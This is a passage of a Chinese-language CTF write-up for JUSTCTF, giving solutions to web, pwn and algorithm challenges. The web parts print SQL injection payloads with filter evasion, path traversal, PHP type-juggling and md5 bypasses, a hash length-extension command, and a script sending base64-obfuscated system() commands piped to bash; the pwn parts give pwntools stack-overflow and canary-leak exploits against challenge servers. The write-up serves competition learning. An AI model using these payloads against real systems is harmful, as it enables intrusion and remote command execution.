</div><a class="post-dummy-target" id="ez_ssrf"></a><h3>ez_ssrf</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
<span class="k">echo</span><span class="s1">&#39;&lt;center&gt;&lt;strong&gt;welc0me to JUSTCTF!!&lt;/strong&gt;&lt;/center&gt;&#39;</span><span class="p">;</span>
<span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
<span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">];</span>
<span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/justctf\.com/&#39;</span><span class="p">,</span><span class="nv">$url</span><span class="p">)){</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/php|file|zip|bzip|zlib|base|data/i&#39;</span><span class="p">,</span><span class="nv">$url</span><span class="p">)){</span>
        <span class="nv">$url</span><span class="o">=</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
        <span class="k">echo</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">echo</span><span class="p">(</span><span class="s1">&#39;臭弟弟!!&#39;</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span><span class="k">else</span><span class="p">{</span>
    <span class="k">echo</span><span class="p">(</span><span class="s2">&#34;就这？&#34;</span><span class="p">);</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>其中<code>file_get_contents()</code>是关键，当目标请求时会判断使用的协议，如<code>http协议</code>这些，但如果是无法识别的协议就会当做目录，如<code>abc://</code>,进而造成目录穿越。
payload:<code>?url=abc://justctf.com/../../../../../flag</code></p>
<p>JUST{ssrf_1s_s0_esay!}</p>
<a class="post-dummy-target" id="easy_php"></a><h3>easy_php</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php">echo &#34;欢迎来到JUSTctf,web没人做，只好送分了&#34;;    
show_source(__FILE__);
$username  = &#34;admin&#34;;
$password  = &#34;password&#34;;
include(&#34;flag.php&#34;);
$data = isset($_POST[&#39;data&#39;])? $_POST[&#39;data&#39;]: &#34;&#34; ;
$data_unserialize = unserialize($data);
if ($data_unserialize[&#39;username&#39;]==$username<span class="err">&amp;&amp;</span>$data_unserialize[&#39;password&#39;]==$password){
    echo $flag; 
}else{
    echo &#34;送分题不要？爬吧&#34;;
}
</code></pre></td></tr></table>
</div>
</div><p>首先尝试 {&lsquo;data&rsquo; : &lsquo;a:2:{s:8:&ldquo;username&rdquo;;s:5:&ldquo;admin&rdquo;;s:8:&ldquo;password&rdquo;;s:8:&ldquo;password&rdquo;;}'}</p>
<p>未知原因错误，不知道为什么。</p>
<p>然后 想到 == 弱类型，构造如下</p>
<p>a:2:{s:8:&ldquo;username&rdquo;;b:1;s:8:&ldquo;password&rdquo;;b:1;}</p>
<a class="post-dummy-target" id="ez_sql"></a><h3>EZ_Sql</h3>
<p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="https://pic2.zhimg.com/v2-e8ae6979e1d8c5de73f6d9e11034d5fd_r.jpg" alt="img" class="lazyload"><figcaption class="image-caption">img</figcaption></figure></p>
<ol>
<li>
<p>输入1&rsquo; 报错， 确认有注入漏洞</p>
</li>
<li>
<p>1&rsquo; order by 2# ， 构造 <code>1%27/**/order/**/by/**/10;%00</code></p>
<p>得知：有十列</p>
</li>
<li>
<p>1&rsquo; union select database(),user()#  构造 <code>'/**/UnIon/**/sElEct/**/database(),user(),version(),@@version_compile_os,user(),user(),user(),user(),user(),user();%00</code></p>
<ol>
<li>databae() : lastsward</li>
<li>user():  root@localhost</li>
<li>version():  10.2.26-MariaDB-log</li>
<li>@@version_compile_os: Linux</li>
</ol>
</li>
<li>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="s1">&#39;uNion/**/seLect/**/table_names,table_schema/**/from/**/information_schema.tables/**/where/**/table_schema/**/=/**/&#39;</span><span class="n">lastsward</span><span class="s1">&#39;;%00 #select  十个
</span><span class="s1">group_concat(table_name)
</span><span class="s1">
</span><span class="s1">&#39;</span><span class="k">uNion</span><span class="cm">/**/</span><span class="k">seLect</span><span class="cm">/**/</span><span class="nf">group_concat</span><span class="p">(</span><span class="n">table_name</span><span class="p">)</span><span class="cm">/**/</span><span class="k">from</span><span class="cm">/**/</span><span class="n">information_schema</span><span class="p">.</span><span class="kp">tables</span><span class="cm">/**/</span><span class="k">where</span><span class="cm">/**/</span><span class="n">table_schema</span><span class="cm">/**/</span><span class="o">=</span><span class="cm">/**/</span><span class="s1">&#39;lastsward&#39;</span><span class="p">;</span><span class="o">%</span><span class="mi">00</span>
</code></pre></td></tr></table>
</div>
</div><p>得知  table_name : flag 、grade、users</p>
</li>
<li>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="s1">&#39;uNion/**/seLect/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/=/**/&#39;</span><span class="n">flag</span><span class="s1">&#39;;%00
</span></code></pre></td></tr></table>
</div>
</div><p>得知 列名：flag、flag</p>
</li>
<li>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">&#39;uNion/**/seLect/**/1,2,3,4,5,6,7,8,9,(sElect/**/flag/**/from/**/flag);%00
</code></pre></td></tr></table>
</div>
</div><p>拿到Flag： JUST{sq1_ls_1nt3r3stlng}</p>
</li>
</ol>
<a class="post-dummy-target" id="ez_upload"></a><h3>Ez_upload</h3>
<p>打开题目，发现又一个upload.php ，猜测上传漏洞，白名单 + 文件重命名。试过N长时间，发现行不通</p>
<p>看到题目给出file=upload.php，联想到ez_ssrf 解题， 直接<code>index.php?file=../../../../../flag</code></p>
<p>得到flag</p>
<a class="post-dummy-target" id="crack_in"></a><h3>Crack_in</h3>
<p>一直解不出来，一直在碰撞time()。。。。。</p>
<p>下午给出提示，hash类攻击</p>
<p>百度搜索相关资料，利用hashpump ， 根据</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">hashpump -s ae8b63d93b14eadd1adb347c9e26595a -d admin -k <span class="m">25</span> -a pcat
</code></pre></td></tr></table>
</div>
</div><p>Postman 传入参数，得到 flag</p>
<a class="post-dummy-target" id="baby_php"></a><h3>Baby_php</h3>
<ol>
<li>
<p>根据hint 和题目源码，首先构造通过Brup 构造cookie 即 访问 <code>http://101.36.122.23:7135/?username=admiN</code>  然后将cookie中 username=<code>YWRtaW4%3d   </code>,等号改为%3d</p>
</li>
<li>
<p>进入下一环节，</p>
<p><code>http://101.36.122.23:7135/admmmmin.php?%6dd51=QNKCDZO&amp;%6dd52=240610708&amp;%6castsward&amp;file=php://input</code></p>
<p>构造md5  url编码绕过</p>
</li>
<li>
<p>最后一个环节， 执行 $a , $b,$c  百度搜索， system(commond,[..]) ， 执行命令找到flag</p>
</li>
</ol>
<a class="post-dummy-target" id="ez_rec"></a><h3>EZ_Rec</h3>
<p>开始.swp发现index的漏洞，根据vim -r 打开文件，发现源码，接下来就是构造一系列payload的过程</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://120.79.25.56:5599/index.php&#39;</span>


<span class="n">Headers</span> <span class="o">=</span><span class="p">{</span>
<span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&#39;</span><span class="p">,</span>
<span class="s1">&#39;Accept&#39;</span><span class="p">:</span> <span class="s1">&#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#39;</span><span class="p">,</span>
<span class="s1">&#39;Accept-Encoding&#39;</span><span class="p">:</span> <span class="s1">&#39;gzip, deflate&#39;</span><span class="p">,</span>
<span class="s1">&#39;Accept-Language&#39;</span><span class="p">:</span> <span class="s1">&#39;zh-CN,zh;q=0.9&#39;</span><span class="p">,</span>
<span class="p">}</span>
<span class="c1">#$_POST[&#34;s&#39;h&#39;ana&#34;}</span>
<span class="c1">#$_POST[&#34;s\hana&#34;]</span>
<span class="c1">#$a=str_replace(x,&#39;&#39;&#39;&#39;,&#39;&#39;axsxxsxexrxxt&#34;)$a($_POST[&#39;shezhang&#39;]);</span>
<span class="c1"># JF9QT1NUWydzaGFuYSdd | base64</span>
<span class="c1">#assert(phpinfo())</span>
<span class="c1">#base64.chr(95).deco\de(&#34;JF9QT1NUWydzaGFuYSddOzs7&#34;)</span>
<span class="c1">#c\\at /var/www/html/index.p\\hp &gt; a.txt</span>
<span class="c1">#YT1gY2F0IGluZGV4LnBocGA7ZWNobyAkYSB8YmFzZTY0 | base64 -d|bas\h</span>
<span class="c1">#&#39;system(&#34;echo YT1gY2F0IGluZGV4LnBocGA7ZWNobyAkYSB8YmFzZTY0 | base64 -d|bas\\h&#34;)?&gt;&#39;</span>
<span class="c1">#order = &#34;find / -name flag;&#34;</span>
<span class="c1">#order = str(base64.b64encode(order.encode(&#39;utf-8&#39;)),&#39;utf-8&#39;)</span>
<span class="c1">#print(order)</span>
<span class="c1">#shana = &#39;system(&#34;echo &#39;+order+&#39;| base64 -d |bas\\h&#34;)?&gt;&#39;</span>
<span class="c1">#print(shana)</span>
<span class="n">data</span> <span class="o">=</span><span class="p">{</span><span class="s1">&#39;shana&#39;</span><span class="p">:</span><span class="s2">&#34;system(&#39;tail  /usr/src/flllaaag |base64&#39;)?&gt;&#34;</span><span class="p">}</span>

    <span class="c1">#print(data[&#39;shana&#39;].find(&#39;JUST{&#39;,0))</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">Headers</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">[:</span><span class="mi">1000</span><span class="p">])</span>
</code></pre></td></tr></table>
</div>
</div><a class="post-dummy-target" id="hex酱未解"></a><h3>hex酱（未解）</h3>
<ol>
<li>有题目得知 hex， 利用hex编码进行 沙箱逃逸</li>
<li>被过滤字符：os|.|system|</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">a = &#39;cat flag.txt&#39;

</code></pre></td></tr></table>
</div>
</div><p>过滤. ， 利用 getattr()函数  <code>getattr(os, &quot;system&quot;)(&quot;whoami&quot;)</code></p>
<p>python 十六进制转hex</p>
<p>利用 <code>getattr(getattr(&quot;impo&quot;&quot;rt&quot;,&quot;join&quot;)([chr(95),chr(95)]),&quot;join&quot;)([chr(95),chr(95)])</code></p>
<a class="post-dummy-target" id="pwn"></a><h2>Pwn</h2>
<a class="post-dummy-target" id="test_your_nc"></a><h3>test_your_nc</h3>
<p>用nc连接，直接出flag</p>
<a class="post-dummy-target" id="究极基础栈溢出"></a><h3>究极基础栈溢出</h3>
<p>nc连接，查看提示，发现backdoor 地址， 以及已经填充esp， 只需pad0*14 字节</p>
<p>写个pwn， 进入 shell， 出 flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">io</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">def</span> <span class="nf">isDebug</span><span class="p">(</span><span class="n">debug</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">io</span>
    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;t1&#39;</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;101.36.122.23&#39;</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="o">*</span> <span class="mh">0x10</span> <span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x804851b</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">isDebug</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">pwn</span><span class="p">()</span>

</code></pre></td></tr></table>
</div>
</div><a class="post-dummy-target" id="基础栈溢出"></a><h3>基础栈溢出</h3>
<p>ida查看源码，发现只要让 v1 = 841,然后 覆盖返回值，进入后门即可</p>
<ol>
<li>
<p>s 和 v1 地址相差 8， 填充8个&rsquo;a&rsquo;，</p>
</li>
<li>
<p>然后覆盖v1的值, p32(841)</p>
</li>
<li>
<p>s和返回值相差24 ，减去之前的12 ，再次填充12个 &lsquo;a&rsquo; 即可</p>
</li>
</ol>
<p>flag{721eadea-8dc8-410a-943c-7e0558499773}</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">from pwn import *
<span class="nv">io</span> <span class="o">=</span> <span class="m">0</span>
def isDebug<span class="o">(</span>debug<span class="o">)</span>:
    global io
    <span class="k">if</span> debug:
        <span class="nv">io</span> <span class="o">=</span> process<span class="o">(</span><span class="s1">&#39;t2&#39;</span><span class="o">)</span>
    <span class="k">else</span>:
        <span class="nv">io</span> <span class="o">=</span> remote<span class="o">(</span><span class="s1">&#39;101.36.122.23&#39;</span>, 10002<span class="o">)</span>

def pwn<span class="o">()</span>:   <span class="c1"># shell : 0x804849B</span>
    <span class="c1">#payload = &#39;aaaaaaaa&#39; + p64(841)</span>
    
    <span class="nv">payload</span> <span class="o">=</span> flat<span class="o">(</span><span class="s1">&#39;a&#39;</span> * 8, p32<span class="o">(</span>841<span class="o">)</span>,<span class="s1">&#39;a&#39;</span>*12,p32<span class="o">(</span>0x0804849B<span class="o">))</span>
    print<span class="o">(</span>payload<span class="o">)</span>
    print<span class="o">(</span>len<span class="o">(</span>payload<span class="o">))</span>
    <span class="c1">#io.send(payload)</span>
    io.sendline<span class="o">(</span>payload<span class="o">)</span>
    io.interactive<span class="o">()</span>
<span class="k">if</span> <span class="nv">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span>:
    isDebug<span class="o">(</span>0<span class="o">)</span>
    pwn<span class="o">()</span>

</code></pre></td></tr></table>
</div>
</div><a class="post-dummy-target" id="canary"></a><h3>Canary</h3>
<p>首先覆盖canary首位&rsquo;\x00&rsquo;，然后p.recv(3)，接着进入 vulu函数，进行变量覆盖，115和 37120 徒手推出</p>
<p>flag{869e5795-d09c-4ba1-abe1-168ecb551ef0}</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;101.36.122.23&#39;</span><span class="p">,</span> <span class="mi">10003</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="s1">&#39;b&#39;</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;[+]How to bypass canary?&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;b&#39;</span><span class="p">)</span>
<span class="n">can</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>

<span class="n">hack</span> <span class="o">=</span> <span class="mh">0x80485cb</span>
<span class="n">payload</span>  <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x73</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x9100</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">can</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">hack</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><a class="post-dummy-target" id="algorithm"></a><h2>Algorithm</h2>
<a class="post-dummy-target" id="小汪钓鱼"></a><h3>小汪钓鱼</h3>
<p>根据题目要求，小汪钓鱼，写算法</p>
<p>最后一步 第一个人执行完，即输出</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">deque</span>

<span class="n">dog</span> <span class="o">=</span> <span class="n">deque</span><span class="p">()</span>
<span class="n">cat</span> <span class="o">=</span> <span class="n">deque</span><span class="p">()</span>
<span class="n">entir</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">card</span> <span class="ow">in</span> <span class="p">[</span><span class="mi">6</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">5</span><span class="p">]:</span>
    <span class="n">dog</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">card</span><span class="p">)</span>
<span class="k">for</span> <span class="n">card</span> <span class="ow">in</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">]:</span>
    <span class="n">cat</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">card</span><span class="p">)</span>



<span class="k">def</span> <span class="nf">dog1</span><span class="p">():</span>
    <span class="n">k</span> <span class="o">=</span> <span class="n">dog</span><span class="o">.</span><span class="n">popleft</span><span class="p">()</span>
    <span class="n">entir</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">d</span> <span class="o">=</span> <span class="n">entir</span><span class="p">[:</span><span class="nb">len</span><span class="p">(</span><span class="n">entir</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="n">d</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
    <span class="k">if</span> <span class="n">d</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
        <span class="n">start</span> <span class="o">=</span> <span class="n">entir</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
        <span class="n">dog</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="nb">reversed</span><span class="p">(</span><span class="n">entir</span><span class="p">[</span><span class="n">start</span><span class="p">:])))</span>
        <span class="k">del</span> <span class="n">entir</span><span class="p">[</span><span class="n">start</span><span class="p">:]</span>
        <span class="k">return</span> <span class="bp">True</span>
    <span class="k">return</span> <span class="bp">False</span>
<span class="k">def</span> <span class="nf">cat1</span><span class="p">():</span>
    <span class="n">m</span> <span class="o">=</span> <span class="n">cat</span><span class="o">.</span><span class="n">popleft</span><span class="p">()</span>
    <span class="n">entir</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>   <span class="c1">#放牌</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">c</span> <span class="o">=</span> <span class="n">entir</span><span class="p">[:</span><span class="nb">len</span><span class="p">(</span><span class="n">entir</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="n">c</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
    <span class="k">if</span> <span class="n">c</span><span class="o">!=-</span><span class="mi">1</span><span class="p">:</span>
        <span class="n">start</span> <span class="o">=</span> <span class="n">entir</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
